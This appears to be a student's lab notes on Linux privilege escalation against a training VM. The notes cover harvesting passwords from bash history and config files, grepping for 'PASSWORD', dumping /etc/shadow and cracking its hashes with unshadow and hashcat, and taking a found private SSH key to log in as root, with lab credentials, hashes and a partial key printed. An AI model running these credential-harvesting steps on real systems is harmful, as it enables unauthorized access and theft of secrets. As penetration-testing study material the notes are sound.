### First technique - history 

1. Check bash history to find any credentials
~~~bash
TCM@debian:~$ history
    1  ls -al
    2  cat .bash_history 
    3  ls -al
    4  mysql -h somehost.local -uroot -ppassword123
    5  exit
    6  cd /tmp
    7  clear
~~~

2. Used obtained creds to login
~~~bash
TCM@debian:~$ su root
Password: 
root@debian:/home/user# exit
exit
~~~

### Second Technique - Finding logs lines 
1. Use payload all the things commands - gives lines containing password. 
~~~bash
TCM@debian:~$ find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
~~~

### Third Technique - Running automated scripts 
1. Run Linpeas script
2. Run Linenum script


### Fourth Technique - Check all files in accessible directory
~~~bash
TCM@debian:~$ ls -la
total 48
drwxr-xr-x  5 TCM  user 4096 Jun 18  2020 .
drwxr-xr-x  3 root root 4096 May 15  2017 ..
-rw-------  1 TCM  user  801 Jun 18  2020 .bash_history
-rw-r--r--  1 TCM  user  220 May 12  2017 .bash_logout
-rw-r--r--  1 TCM  user 3235 May 14  2017 .bashrc
drwx------  2 TCM  user 4096 Aug 17 01:57 .gnupg
drwxr-xr-x  2 TCM  user 4096 May 13  2017 .irssi
-rw-------  1 TCM  user  137 May 15  2017 .lesshst
-rw-r--r--  1 TCM  user  212 May 15  2017 myvpn.ovpn
-rw-------  1 TCM  user   11 Jun 18  2020 .nano_history
-rw-r--r--  1 TCM  user  725 May 13  2017 .profile
drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools
TCM@debian:~$ cat myvpn.ovpn 
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

TCM@debian:~$ cat /etc/openvpn/auth.txt
user
password321

~~~


### Fifth Technique - Weak File Permissions

- cat out /etc/passwd
~~~bash
TCM@debian:~$ ls -la /etc/passwd
-rw-r--r-- 1 root root 950 Jun 17  2020 /etc/passwd
TCM@debian:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:103:65534::/var/lib/nfs:/bin/false
TCM:x:1000:1000:user,,,:/home/user:/bin/bash
~~~

- cat out /etc/shadow
~~~bash
cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::
~~~


- copy both on local machine
~~~bash
(kali㉿kali)-[~]
└─$ ls                                                            
Desktop  Documents  Downloads  Music  passwd  Pictures  Public  shadow  Templates  unshadow  Videos
~~~

- unshadow using both file
~~~bash
┌──(kali㉿kali)-[~]
└─$ unshadow passwd shadow
~~~

- use hashcat to crack unshadow file - [hashes types examples](https://hashcat.net/wiki/doku.php?id=example_hashes)
~~~bash
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1800 -a 0 unshadow /usr/share/wordlists/rockyou.txt 
~~~

- Login using obtained creds. 

### Sixth techniques - SSH keys 
- Find the authorized keys or id_rsa keys. #sshkeys
~~~bash
TCM@debian:~$ find / -name authorized_keys 2> /dev/null
TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa
~~~

- Copied id_rsa in the local machine.
~~~bash
TCM@debian:~$ cat /backups/supersecretkeys/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAzSWvqfxeIpTuFmdAFyWDQho0h8ud3g9zSJ32pjosNcTQJe3/kYC4
B5hMlfIXzH5oKn9YRn55O10RYxppZpXFsc4H7pYquD5TLKLma
~~~

- Give read and write permission to owners only for id_rsa file and build connection
~~~bash
┌──(kali㉿kali)-[~]
└─$ sudo chmod 600 id_rsa 

┌──(kali㉿kali)-[~]
└─$ sudo ssh -i id_rsa -oHostKeyAlgorithms=+ssh-dss root@10.10.100.135 
~~~

